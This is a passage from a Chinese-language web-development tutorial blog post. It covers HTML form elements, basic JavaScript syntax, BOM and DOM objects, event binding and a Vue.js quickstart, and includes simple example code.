class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sing&quot;</span>&gt;</span> sing <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     图像: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     生日: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birthday&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     时间: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;time&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     日期时间: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">name</span>=<span class="string">&quot;datetime&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     邮箱: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     学历: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;degree&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>----------- 请选择 -----------<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>博士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">select</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     描述: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">	 	</span><br><span class="line">     <span class="comment">&lt;!-- 表单常见按钮 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span>   </span><br><span class="line">     <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过浏览器打开上述的表单项html文件，最终展示出的表单信息如下：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d4e6fd6e75794d9e43ad0c6a3d4c6078--0018--image-20231121184043690.png" alt="image-20231121184043690"></p>
<h3 id="7-CSS善用文档"><a href="#7-CSS善用文档" class="headerlink" title="7).CSS善用文档"></a>7).CSS善用文档</h3><p>进入W3C进行查询。即用即查即可</p>
<h2 id="3、js的基本使用"><a href="#3、js的基本使用" class="headerlink" title="3、js的基本使用"></a>3、js的基本使用</h2><h3 id="1-书写语法"><a href="#1-书写语法" class="headerlink" title="1).书写语法"></a>1).书写语法</h3><ul>
<li><p>区分大小写：与 Java 一样，变量名、函数名以及其他一切东西都是区分大小写的</p>
</li>
<li><p>每行结尾的分号可有可无</p>
</li>
<li><p>大括号表示代码块</p>
</li>
<li><p>注释：</p>
<ul>
<li><p>单行注释：&#x2F;&#x2F; 注释内容</p>
</li>
<li><p>多行注释：&#x2F;* 注释内容 *&#x2F;</p>
</li>
</ul>
</li>
</ul>
<p>我们需要借助js中3钟输出语句，来演示书写语法</p>
<table>
<thead>
<tr>
<th>api</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>window.alert()</td>
<td>警告框</td>
</tr>
<tr>
<td>document.write()</td>
<td>在HTML 输出内容</td>
</tr>
<tr>
<td>console.log()</td>
<td>写入浏览器控制台</td>
</tr>
</tbody></table>
<h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2).变量"></a>2).变量</h3><p>书写语法会了，变量是一门编程语言比不可少的，所以接下来我们需要学习js中变量的声明，在js中，变量的声明和java中还是不同的。首先js中主要通过如下3个关键字来声明变量的：</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>var</td>
<td>早期ECMAScript5中用于变量声明的关键字</td>
</tr>
<tr>
<td>let</td>
<td>ECMAScript6中新增的用于变量声明的关键字，相比较var，let只在代码块内生效</td>
</tr>
<tr>
<td>const</td>
<td>声明常量的，常量一旦声明，不能修改</td>
</tr>
</tbody></table>
<p>在js中声明变量还需要注意如下几点：</p>
<ul>
<li>JavaScript 是一门弱类型语言，变量可以存放不同类型的值 。</li>
<li>变量名需要遵循如下规则：<ul>
<li>组成字符可以是任何字母、数字、下划线（_）或美元符号（$）</li>
<li>数字不能开头</li>
<li>建议使用驼峰命名</li>
</ul>
</li>
</ul>
<h3 id="3-数据类型与运算符"><a href="#3-数据类型与运算符" class="headerlink" title="3).数据类型与运算符"></a>3).数据类型与运算符</h3><p>这两个就不用多说了，直接放表格</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>number</td>
<td>数字（整数、小数、NaN(Not a Number)）</td>
</tr>
<tr>
<td>string</td>
<td>字符串，单双引皆可</td>
</tr>
<tr>
<td>boolean</td>
<td>布尔。true，false</td>
</tr>
<tr>
<td>null</td>
<td>对象为空</td>
</tr>
<tr>
<td>undefined</td>
<td>当声明的变量未初始化时，该变量的默认值是 undefined</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>运算规则</th>
<th>运算符</th>
</tr>
</thead>
<tbody><tr>
<td>算术运算符</td>
<td>+ , - , * , &#x2F; , % , ++ , –</td>
</tr>
<tr>
<td>赋值运算符</td>
<td>&#x3D; , +&#x3D; , -&#x3D; , *&#x3D; , &#x2F;&#x3D; , %&#x3D;</td>
</tr>
<tr>
<td>比较运算符</td>
<td>&gt; , &lt; , &gt;&#x3D; , &lt;&#x3D; , !&#x3D; , &#x3D;&#x3D; , &#x3D;&#x3D;&#x3D;   注意     &#x3D;&#x3D; 会进行类型转换，&#x3D;&#x3D;&#x3D; 不会进行类型转换</td>
</tr>
<tr>
<td>逻辑运算符</td>
<td>&amp;&amp; , || , !</td>
</tr>
<tr>
<td>三元运算符</td>
<td>条件表达式 ? true_value: false_value</td>
</tr>
</tbody></table>
<h3 id="4-函数"><a href="#4-函数" class="headerlink" title="4).函数"></a>4).函数</h3><h4 id="①第一种定义方法"><a href="#①第一种定义方法" class="headerlink" title="①第一种定义方法"></a>①第一种定义方法</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> 函数名(参数<span class="number">1</span>,参数<span class="number">2.</span>.)&#123;</span><br><span class="line">    要执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为JavaScript是弱数据类型的语言，所以有如下几点需要注意：</p>
<ul>
<li>形式参数不需要声明类型，并且JavaScript中不管什么类型都是let或者var去声明，加上也没有意义。</li>
<li>返回值也不需要声明类型，直接return即可</li>
</ul>
<h4 id="②第二种定义方法"><a href="#②第二种定义方法" class="headerlink" title="②第二种定义方法"></a>②第二种定义方法</h4><p>第二种可以通过var去定义函数的名字，具体格式如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> functionName = <span class="keyword">function</span> (<span class="params">参数<span class="number">1</span>,参数<span class="number">2.</span>.</span>)&#123;   </span><br><span class="line">	<span class="comment">//要执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他的和第一种方法是相同的</p>
<h3 id="5-BOM对象"><a href="#5-BOM对象" class="headerlink" title="5).BOM对象"></a>5).BOM对象</h3><p>BOM中提供了如下5个对象：</p>
<table>
<thead>
<tr>
<th align="left">对象名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Window</td>
<td align="left">浏览器窗口对象</td>
</tr>
<tr>
<td align="left">Navigator</td>
<td align="left">浏览器对象</td>
</tr>
<tr>
<td align="left">Screen</td>
<td align="left">屏幕对象</td>
</tr>
<tr>
<td align="left">History</td>
<td align="left">历史记录对象</td>
</tr>
<tr>
<td align="left">Location</td>
<td align="left">d地址栏对象</td>
</tr>
</tbody></table>
<p>上述5个对象与浏览器各组成对应的关系如下图所示：</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4188d3cbe1ed885e474d4ffbe61b3ddd--9adc--image-20231121185953491.png" alt="image-20231121185953491"></p>
<p>主要使用到的是Windows和Location这两个</p>
<h4 id="①Windows对象"><a href="#①Windows对象" class="headerlink" title="①Windows对象"></a>①Windows对象</h4><p>window对象指的是浏览器窗口对象，是JavaScript的全部对象，所以对于window对象，我们可以直接使用，并且对于window对象的方法和属性，我们可以省略window.例如：我们之前学习的alert()函数其实是属于window对象的,其完整的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.alert(&#x27;hello&#x27;);</span><br></pre></td></tr></table></figure>

<p>其可以省略window.  所以可以简写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(&#x27;hello&#x27;)</span><br></pre></td></tr></table></figure>

<p>所以对于window对象的属性和方法，我们都是采用简写的方式。window提供了很多属性和方法，下表列出了常用属性和方法</p>
<p>window对象提供了获取其他BOM对象的属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>history</td>
<td>用于获取history对象</td>
</tr>
<tr>
<td>location</td>
<td>用于获取location对象</td>
</tr>
<tr>
<td>Navigator</td>
<td>用于获取Navigator对象</td>
</tr>
<tr>
<td>Screen</td>
<td>用于获取Screen对象</td>
</tr>
</tbody></table>
<p>也就是说我们要使用location对象，只需要通过代码<code>window.location</code>或者简写<code>location</code>即可使用</p>
<p>window也提供了一些常用的函数，如下表格所示：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>alert()</td>
<td>显示带有一段消息和一个确认按钮的警告框。</td>
</tr>
<tr>
<td>comfirm()</td>
<td>显示带有一段消息以及确认按钮和取消按钮的对话框。</td>
</tr>
<tr>
<td>setInterval()</td>
<td>按照指定的周期（以毫秒计）来调用函数或计算表达式。</td>
</tr>
<tr>
<td>setTimeout()</td>
<td>在指定的毫秒数后调用函数或计算表达式。</td>
</tr>
</tbody></table>
<h4 id="②Location对象"><a href="#②Location对象" class="headerlink" title="②Location对象"></a>②Location对象</h4><p>location是指代浏览器的地址栏对象，对于这个对象，我们常用的是href属性，用于获取或者设置浏览器的地址信息，添加如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取浏览器地址栏信息</span></span><br><span class="line"><span class="title function_">alert</span>(location.<span class="property">href</span>);</span><br><span class="line"><span class="comment">//设置浏览器地址栏信息</span></span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://www.itcast.cn&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>浏览器效果如下：首先弹框展示浏览器地址栏信息，</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/2fb1b4a2882b8e052bbc146ab2538a5b--a4c9--image-20231121191247946.png" alt="image-20231121191247946"></p>
<p>然后点击确定后，因为我们设置了地址栏信息，所以浏览器跳转到传智首页</p>
<h3 id="6-DOM对象"><a href="#6-DOM对象" class="headerlink" title="6).DOM对象"></a>6).DOM对象</h3><p>HTML中的Element对象可以通过Document对象获取，而Document对象是通过window对象获取的。document对象提供的用于获取Element元素对象的api如下表所示：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.getElementById()</td>
<td>根据id属性值获取，返回单个Element对象</td>
</tr>
<tr>
<td>document.getElementsByTagName()</td>
<td>根据标签名称获取，返回Element对象数组</td>
</tr>
<tr>
<td>document.getElementsByName()</td>
<td>根据name属性值获取，返回Element对象数组</td>
</tr>
<tr>
<td>document.getElementsByClassName()</td>
<td>根据class属性值获取，返回Element对象数组</td>
</tr>
</tbody></table>
<p>操作属性</p>
<p>那么获取到标签了，我们如何操作标签的属性呢？通过查询文档资料，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f44d21e5a1292672353de1d459108e31--a783--image-20231121192858063.png" alt="image-20231121192858063"></p>
<p>得出我们可以通过div标签对象的innerHTML属性来修改标签的内容。此时我们想把页面中的<strong>传智教育替换成传智教育666</strong>，所以要获取2个div中的第一个，所以可以通过下标0获取数组中的第一个div，注释之前的代码，编写如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">div1.<span class="property">innerHTML</span> = <span class="string">&quot;传智教育666&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>浏览器刷新页面，展示效果如下图所示：</p>
<p>浏览器刷新页面，展示效果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/5db9ab60bdd4f569c18c988a032a4621--5c20--image-20231121192928778.png" alt="image-20231121192928778"></p>
<p> 发现页面内容变成了传智教育666</p>
<p>全部源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS-对象-DOM<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;img/off.gif&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>传智教育<span class="tag">&lt;/<span class="name">div</span>&gt;</span>   <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>黑马程序员<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 电影</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 旅游</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 游戏</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1. 获取Element元素</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.1 获取元素-根据ID获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var img = document.getElementById(&#x27;h1&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// alert(img);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.2 获取元素-根据标签获取 - div</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByTagName(&#x27;div&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.3 获取元素-根据name属性获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var ins = document.getElementsByName(&#x27;hobby&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; ins.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(ins[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.4 获取元素-根据class属性获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByClassName(&#x27;cls&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//2. 查询参考手册, 属性、方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    div1.<span class="property">innerHTML</span> = <span class="string">&quot;传智教育666&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-事件绑定"><a href="#7-事件绑定" class="headerlink" title="7).事件绑定"></a>7).事件绑定</h3><h4 id="方式1：通过html标签中的事件属性进行绑定"><a href="#方式1：通过html标签中的事件属性进行绑定" class="headerlink" title="方式1：通过html标签中的事件属性进行绑定"></a>方式1：通过html标签中的事件属性进行绑定</h4><p>例如一个按钮，我们对于按钮可以绑定单机事件，可以借助标签的onclick属性，属性值指向一个函数。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;事件绑定1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;on()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>很明显没有on函数，所以我们需要创建该函数，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">on</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;按钮1被点击了...&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方式2：通过DOM中Element元素的事件属性进行绑定"><a href="#方式2：通过DOM中Element元素的事件属性进行绑定" class="headerlink" title="方式2：通过DOM中Element元素的事件属性进行绑定"></a>方式2：通过DOM中Element元素的事件属性进行绑定</h4><p>依据我们学习过得DOM的知识点，我们知道html中的标签被加载成element对象，所以我们也可以通过element对象的属性来操作标签的属性。此时我们再次添加一个按钮，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;事件绑定2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以先通过id属性获取按钮对象，然后操作对象的onclick属性来绑定事件，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn2&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;按钮2被点击了...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-一些常见的事件"><a href="#8-一些常见的事件" class="headerlink" title="8).一些常见的事件"></a>8).一些常见的事件</h3><table>
<thead>
<tr>
<th>事件属性名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>onclick</td>
<td>鼠标单击事件</td>
</tr>
<tr>
<td>onblur</td>
<td>元素失去焦点</td>
</tr>
<tr>
<td>onfocus</td>
<td>元素获得焦点</td>
</tr>
<tr>
<td>onload</td>
<td>某个页面或图像被完成加载</td>
</tr>
<tr>
<td>onsubmit</td>
<td>当表单提交时触发该事件</td>
</tr>
<tr>
<td>onmouseover</td>
<td>鼠标被移到某元素之上</td>
</tr>
<tr>
<td>onmouseout</td>
<td>鼠标从某元素移开</td>
</tr>
</tbody></table>
<h2 id="4、vue的基本使用"><a href="#4、vue的基本使用" class="headerlink" title="4、vue的基本使用"></a>4、vue的基本使用</h2><h3 id="1、快速入门"><a href="#1、快速入门" class="headerlink" title="1、快速入门"></a>1、快速入门</h3><p>第一步：将vue.js下载拷贝到项目目录下</p>
<p>第二步：然后编写&lt;script&gt;标签来引入vue.js文件，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三步：在js代码区域定义vue对象,代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//定义Vue对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>, <span class="comment">//vue接管区域</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&quot;Hello Vue&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在创建vue对象时，有几个常用的属性：</p>
<ul>
<li>el:  用来指定哪儿些标签受 Vue 管理。 该属性取值 <code>#app</code> 中的 <code>app</code> 需要是受管理的标签的id属性值</li>
<li>data: 用来定义数据模型</li>
<li>methods: 用来定义函数。这个我们在后面就会用到</li>
</ul>
<p>第四步：在html区域编写视图，其中双大括号是插值表达式，用来将vue对象中定义的model展示到页面上的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器打开效果如图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/9485d513933405e6a210b4d9c55c3643--bbba--image-20231121195000984.png" alt="image-20231121195000984"></p>
<h3 id="2、vue指令"><a href="#2、vue指令" class="headerlink" title="2、vue指令"></a>2、vue指令</h3><table>
<thead>
<tr>
<th><strong>指令</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><u><strong>v-bind</strong></u></td>
<td><u><strong>为HTML标签绑定属性值，如设置  href , css样式等</strong></u></td>
</tr>
<tr>
<td><u><strong>v-model</strong></u></td>
<td><u><strong>在表单元素上创建双向数据绑定</strong></u></td>
</tr>
<tr>
<td>v-on</td>
<td>为HTML标签绑定事件</td>
</tr>
<tr>
<td>v-if</td>
<td>条件性的渲染某元素，判定为true时渲染,否则不渲染</td>
</tr>
<tr>
<td>v-else</td>
<td></td>
</tr>
<tr>
